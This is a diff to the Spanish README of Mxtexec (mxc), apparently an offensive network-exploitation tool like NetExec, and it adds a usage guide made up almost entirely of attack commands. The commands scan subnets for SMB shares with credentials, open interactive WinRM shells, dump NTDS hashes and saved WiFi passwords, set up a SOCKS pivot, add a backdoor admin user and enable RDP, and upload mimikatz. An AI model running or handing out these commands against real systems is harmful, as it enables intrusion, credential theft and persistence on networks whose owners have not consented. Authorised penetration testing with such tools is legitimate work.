@@ -1,20 +1,34 @@
-# Mxtexec (mxc)
+# Mxtexec (mxc) - La tortuga más letal del pentesting 🐢💀
 
-![Banner](https://raw.githubusercontent.com/Falconmx1/Mxtexec/main/docs/banner.png)
-
-**Mxtexec (mxc)** - Herramienta de ejecución en red para explotación y post-explotación. Automatiza la evaluación de seguridad en grandes redes. Como NetExec pero con caparazón de tortuga. Rápido, sigiloso y letal. 🐢⚡
-
-## Instalación
-
+## Instalación rápida
 ```bash
 git clone https://github.com/Falconmx1/Mxtexec.git
 cd Mxtexec
 pip install -e .
 
-Uso básico
-# Enumerar shares SMB
-mxc smb 192.168.1.10 -u admin -p Pass123 --shares
+Escaneo CIDR masivo con multithreading
+mxc smb 192.168.1.0/24 -u admin -p Pass123 --shares -t 50
 
-# Próximamente: ejecutar comandos por WinRM
-# mxc winrm 192.168.1.10 -u admin -p Pass123 --command "whoami"
+Shell interactivo por WinRM
+mxc winrm 192.168.1.100 -u administrator -p Pass123 --interactive
 
+Dumpear hashes NTDS (secretsdump)
+mxc smb 192.168.1.100 -u admin -p Pass123 --dump-hashes
+
+SOCKS proxy para pivotear
+mxc proxy --start --port 1080
+# Ahora usa proxychains: proxychains nmap -sT -Pn 10.0.0.0/24
+
+Post-explotación: agregar usuario admin y habilitar RDP
+mxc winrm 192.168.1.100 -u admin -p Pass123 --add-admin hacker Pass123!
+mxc winrm 192.168.1.100 -u admin -p Pass123 --enable-rdp
+
+Subir/descargar archivos
+mxc winrm 192.168.1.100 -u admin -p Pass123 --upload mimikatz.exe C:\\Windows\\Temp\\mimi.exe
+mxc winrm 192.168.1.100 -u admin -p Pass123 --download C:\\flag.txt flag.txt
+
+Post-explotación completa (info del sistema, usuarios, etc.)
+mxc winrm 192.168.1.100 -u admin -p Pass123 --post-exploit
+
+Dumpear contraseñas WiFi guardadas
+mxc winrm 192.168.1.100 -u admin -p Pass123 --dump-wifi
